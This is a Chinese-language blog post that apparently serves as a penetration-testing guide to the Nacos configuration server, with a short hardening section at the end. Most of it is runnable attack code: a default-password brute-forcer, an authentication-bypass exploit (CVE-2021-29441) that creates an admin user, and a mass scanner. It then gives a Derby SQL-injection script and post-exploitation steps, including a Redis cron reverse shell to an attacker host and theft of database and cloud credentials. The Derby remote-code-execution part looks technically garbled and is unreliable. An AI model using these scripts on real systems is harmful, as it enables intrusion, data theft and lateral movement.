---
title: Nacos安全测试
date: 2026-04-10 08:00:00
tags:
  - 云安全
  - 框架安全
  - 渗透测试
categories: 渗透测试
---

## 免责声明

本文所述技术仅供安全研究、授权测试及防御学习使用。未经授权对他人系统进行测试属于违法行为。读者应遵守《网络安全法》及相关法律法规，因不当使用本文内容造成的任何后果，作者不承担法律责任。

## 引言

Nacos 是阿里巴巴开源的服务发现与配置管理中间件，在微服务架构中被广泛部署。由于默认配置不当、历史漏洞缺乏修复等问题，Nacos 常年处于攻防对抗的高频目标之列。本文从渗透测试角度，系统梳理 Nacos 常见的安全风险及利用方式。

## 一、环境探测与版本识别

Nacos 默认运行在 8848 端口。Fofa 等资产测绘平台可通过以下语法批量发现：

```
app="NACOS" && port="8848"
title="Nacos"
```

获取版本信息的接口：

```bash
curl http://target:8848/nacos/v1/console/server/state
```

返回 JSON 中包含 `version` 和 `standalone_mode` 字段。standalone 模式代表使用内置 Derby 数据库，这是后续攻击的重要前提。

## 二、默认凭证 nacos/nacos

Nacos 默认管理员账户为 `nacos/nacos`，早期版本无强制修改密码机制，大量生产环境直接沿用默认凭证。

### 登录验证

```bash
curl -X POST 'http://target:8848/nacos/v1/auth/login' \
  -d 'username=nacos&password=nacos'
```

响应中返回 `accessToken` 即登录成功，之后所有请求的 Authorization Header 携带 `Bearer {accessToken}` 即可维持会话。

### 弱口令爆破脚本

```python
import requests

TARGET = "http://192.168.1.100:8848"
URL = f"{TARGET}/nacos/v1/auth/login"

users = ["nacos", "admin"]
passwords = ["nacos", "admin123", "Nacos@123", "nacos123", "123456"]

for u in users:
    for p in passwords:
        r = requests.post(URL, data={"username": u, "password": p})
        if "accessToken" in r.text:
            print(f"[+] Found: {u}:{p}")
            print(f"    Token: {r.json()['accessToken']}")
            break
```

## 三、未授权访问

Nacos 多项核心 API 在未配置认证时可直接访问，这是最常见的暴露面。

### 用户列表泄漏

```bash
curl 'http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=10'
```

返回所有用户名及 BCrypt 密文密码，可用于离线爆破和用户枚举。

### 配置信息泄漏

Nacos 作为配置中心存储着数据库连接串、Redis 密码、各类云服务 AK/SK 等敏感信息：

```bash
# 列出命名空间
curl 'http://target:8848/nacos/v1/console/namespaces'

# 列出所有配置
curl 'http://target:8848/nacos/v1/cs/configs?pageNo=1&pageSize=500'

# 读取指定配置
curl 'http://target:8848/nacos/v1/cs/configs?dataId=application.yml&group=DEFAULT_GROUP'
```

常见泄漏内容：
- JDBC 连接字符串（含数据库账号密码）
- Redis 连接密码
- OSS / SMS / MQ 等云服务 AK/SK
- 第三方 API 密钥及证书私钥

## 四、CVE-2021-29441 身份验证绕过

### 漏洞原理

影响版本：Nacos <= 1.4.1。`com.alibaba.nacos.auth.AuthFilter` 中对 User-Agent 进行白名单校验，若请求头以 `Nacos-Server` 开头，则判定为服务端内部请求，直接跳过认证过滤器：

```java
String agent = request.getHeader("User-Agent");
if (agent != null && agent.startsWith("Nacos-Server")) {
    chain.doFilter(request, response);  // 跳过认证
    return;
}
```

### 利用方式

```bash
# 无需认证直接添加管理员用户
curl -X POST 'http://target:8848/nacos/v1/auth/users' \
  -H 'User-Agent: Nacos-Server' \
  -d 'username=hacker&password=hacker123'

# 无需认证读取所有配置
curl 'http://target:8848/nacos/v1/cs/configs?pageNo=1&pageSize=999' \
  -H 'User-Agent: Nacos-Server'
```

### 批量检测脚本

```python
import requests, sys

def check(host):
    url = f"http://{host}:8848/nacos/v1/auth/users"
    r = requests.get(url, headers={"User-Agent": "Nacos-Server"}, timeout=5)
    return r.status_code == 200 and "pageItems" in r.text

with open(sys.argv[1]) as f:
    for line in f:
        h = line.strip()
        if check(h):
            print(f"[VULN] {h}")
```

### 完整攻击链

```bash
# 1. 添加用户
curl -X POST 'http://target:8848/nacos/v1/auth/users' \
  -H 'User-Agent: Nacos-Server' \
  -d 'username=test&password=Test@123'

# 2. 获取命名空间
curl 'http://target:8848/nacos/v1/console/namespaces' \
  -H 'User-Agent: Nacos-Server'

# 3. 遍历读取所有配置
curl 'http://target:8848/nacos/v1/cs/configs?pageNo=1&pageSize=500' \
  -H 'User-Agent: Nacos-Server'

# 4. 逐个获取配置详情
for tid in "${tenants[@]}"; do
  curl "http://target:8848/nacos/v1/cs/configs?dataId=&group=DEFAULT_GROUP&tenant=${tid}" \
    -H 'User-Agent: Nacos-Server'
done
```

## 五、User-Agent Header 绕过变体

除 `Nacos-Server` 外，不同版本的白名单机制可能存在差异，以下变体值得尝试：

```bash
curl -H 'User-Agent: Nacos-Server'   http://target:8848/nacos/v1/cs/configs
curl -H 'User-Agent: Nacos-Client'   http://target:8848/nacos/v1/cs/configs
curl -H 'User-Agent: nacos-server'   http://target:8848/nacos/v1/cs/configs
```

部分未纳入认证拦截器的路径同样可被未授权访问：

```
/nacos/v1/cs/ops/derby
/nacos/v1/ns/operator/servers
/nacos/v1/ns/upgrade/ops/metrics
```

多路径多 UA 组合探测脚本：

```python
import requests

paths = ["/nacos/v1/auth/users", "/nacos/v1/cs/configs",
         "/nacos/v1/console/namespaces"]
uas = ["Nacos-Server", "Nacos-Client"]

def scan(target):
    for p in paths:
        for ua in uas:
            r = requests.get(f"http://{target}:8848{p}",
                             headers={"User-Agent": ua}, timeout=5)
            if r.status_code == 200 and "pageItems" in r.text:
                print(f"[+] {target}{p}  bypassed with UA: {ua}")
```

## 六、Nacos RCE via Derby

Nacos standalone 模式使用内置 Apache Derby 数据库，Derby 在历史版本中暴露出 SQL 注入漏洞，可进一步利用实现远程代码执行。

### Derby SQL 注入

部分配置查询接口直接拼接用户参数到 SQL 语句：

```sql
-- 枚举 Derby 所有表
SELECT tablename FROM sys.systables WHERE tabletype = 'T'

-- 读取用户密码
SELECT username, password FROM users
```

### 利用 Derby 内置过程写文件实现 RCE

Derby 允许注册 Java 函数并在 SQL 中调用，攻击者可以通过注入点创建恶意函数执行系统命令：

```sql
-- 利用 SYSCS_UTIL 写文件到 Web 目录
CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY(
  'SELECT * FROM users',
  '/tmp/shell.jsp',
  null, null, 'UTF-8'
);
```

若 Nacos 部署在 Tomcat 等容器中，可将 Webshell 写入 webapps 目录实现 RCE。

### 综合攻击脚本

```python
import requests, urllib.parse

TARGET = "http://192.168.1.100:8848"
HEADERS = {"User-Agent": "Nacos-Server"}

def sqli(sql):
    payload = f"test' OR 1=1; {sql} --"
    url = f"{TARGET}/nacos/v1/cs/configs?dataId={urllib.parse.quote(payload)}&group=DEFAULT_GROUP"
    return requests.get(url, headers=HEADERS).text

# 获取 Derby 版本
print(sqli("SELECT getdatabaseversion() FROM sysibm.sysdummy1"))

# 枚举表名
print(sqli("SELECT tablename FROM sys.systables WHERE tabletype='T'"))

# 读取用户密码
print(sqli("SELECT username, password FROM users"))
```

## 七、配置泄漏后的横向移动

获取配置中的凭据后，常见的横向移动路径如下。

**数据库直连**：Nacos 配置中常见如下内容：

```yaml
spring:
  datasource:
    url: jdbc:mysql://10.0.1.5:3306/prod_db
    username: root
    password: P@ssw0rd2024
```

利用提取的凭据直连数据库导出业务数据：

```bash
mysql -h 10.0.1.5 -u root -p'P@ssw0rd2024' -e "SELECT * FROM users LIMIT 10"
```

**Redis GetShell**：若配置中泄漏 Redis 密码，可写入计划任务反弹 Shell：

```bash
redis-cli -h 10.0.1.6 -a 'redis_pass'
> config set dir /var/spool/cron/
> config set dbfilename root
> set x "\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n"
> save
```

**云 AK/SK 滥用**：提取到阿里云等 AK/SK 后可操作云资源：

```bash
aliyun configure set --access-key-id LTAI5txxxxxxxx \
                     --access-key-secret xxxxxxxxxxxxxxxx
aliyun oss ls
aliyun oss cp oss://bucket-name/sensitive_file ./
```

**内网服务枚举**：通过 Nacos 服务列表获取内网拓扑：

```bash
curl 'http://target:8848/nacos/v1/ns/service/list?pageNo=1&pageSize=1000' \
  -H 'User-Agent: Nacos-Server'
```

返回的 IP、端口、健康状态信息可作为下一阶段内网渗透的靶标。

## 八、安全加固建议

1. **升级版本**：升级至 Nacos 2.3.0 及以上，新版本认证机制有大幅改进。
2. **修改默认凭证**：部署后立即修改 nacos/nacos 默认密码。
3. **开启认证**：在 `application.properties` 中配置：
   ```properties
   nacos.core.auth.enabled=true
   nacos.core.auth.server.identity.key=自定义Key
   nacos.core.auth.server.identity.value=自定义Value
   nacos.core.auth.plugin.nacos.token.secret.key=随机Base64字符串
   ```
4. **网络隔离**：8848 端口绑定内网 IP，禁止公网暴露，前端部署 WAF。
5. **最小权限**：Nacos 所用数据库账户配置最小权限，并在网络层做访问控制。
6. **日志审计**：开启访问日志并接入 SIEM，监控异常的配置读取行为。
7. **敏感数据加密**：配置中的敏感字段使用加密存储或外部密钥管理服务（如 Vault）。

## 总结

Nacos 作为微服务架构的核心组件，其安全性直接影响整个业务体系。本文梳理了从信息探测到权限提升的完整攻击面，涵盖了默认凭证、未授权访问、CVE-2021-29441 绕过、Derby RCE 以及配置泄漏后的横向移动路径。攻防实践中 Nacos 常被作为突破内网的跳板，安全人员应在日常巡检中将 Nacos 列为必检项，开发团队应严格遵循加固建议，降低被入侵风险。

## 参考链接

- Nacos 官方文档：https://nacos.io/docs/latest/
- Nacos GitHub：https://github.com/alibaba/nacos
- CVE-2021-29441：https://nvd.nist.gov/vuln/detail/CVE-2021-29441
- Apache Derby 文档：https://db.apache.org/derby/
